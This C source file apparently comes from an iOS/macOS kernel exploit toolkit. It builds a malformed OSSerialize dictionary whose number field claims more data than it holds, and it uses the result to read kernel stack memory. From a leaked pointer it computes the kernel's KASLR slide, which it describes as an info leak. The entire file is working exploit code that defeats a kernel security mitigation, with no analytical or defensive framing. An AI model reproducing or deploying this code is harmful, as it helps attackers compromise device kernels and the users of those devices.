#include <errno.h>              // errno
#include <stddef.h>             // size_t
#include <stdint.h>             // uint32_t
#include <stdlib.h>             // malloc
#include <string.h>             // strerror

#include "common.h"             // DEBUG, PRINT_BUF, SIZE
#include "io.h"                 // kOS*, dict_get_bytes
#include "offsets.h"            // off_anchor
#include "try.h"                // THROW, TRY, FINALLY

#include "slide.h"

addr_t get_kernel_anchor(void)
{
    static addr_t anchor = 0;
    if(anchor == 0)
    {

        size_t bufsize = 0x80;
        uint32_t buflen = (uint32_t)bufsize;
        const char key[4] = "lol";
        uint32_t dict[7] =
        {
            kOSSerializeMagic,                                              // Magic
            kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries
            kOSSerializeSymbol | 4,                                         // Key symbol with 4 bytes
            *((uint32_t*)key),                                              // "lol", used later with IORegistryEntryGetProperty
            kOSSerializeEndCollection | kOSSerializeNumber | (8 * bufsize), // number of bits
            0x69696969,                                                     // Need sizeof(long long) bytes to pass checks
            0x69696969,
        };
        PRINT_BUF("Dict", dict, sizeof(dict));

        size_t *buf = malloc(bufsize);
        if(buf == NULL)
        {
            THROW("Failed to allocate buffer (%s)", strerror(errno));
        }
        TRY
        ({
            dict_get_bytes(dict, sizeof(dict), key, buf, &buflen);

            PRINT_BUF("Kernel stack", buf, buflen);
#ifdef __LP64__
            anchor = buf[1];
#else
            anchor = buf[9];
#endif
        })
        FINALLY
        ({
            free(buf);
        })
    }
    return anchor;
}

size_t get_kernel_slide(void)
{
    static size_t kslide = 0;
    if(kslide == 0)
    {
        DEBUG("Using info leak to get kernel slide...");

        kslide = get_kernel_anchor() - off_anchor();
        DEBUG("Kernel slide: " SIZE, kslide);

        if(kslide % 0x100000 != 0)
        {
            THROW("Kernel slide is not a multiple of 0x100000");
        }
    }
    return kslide;
}
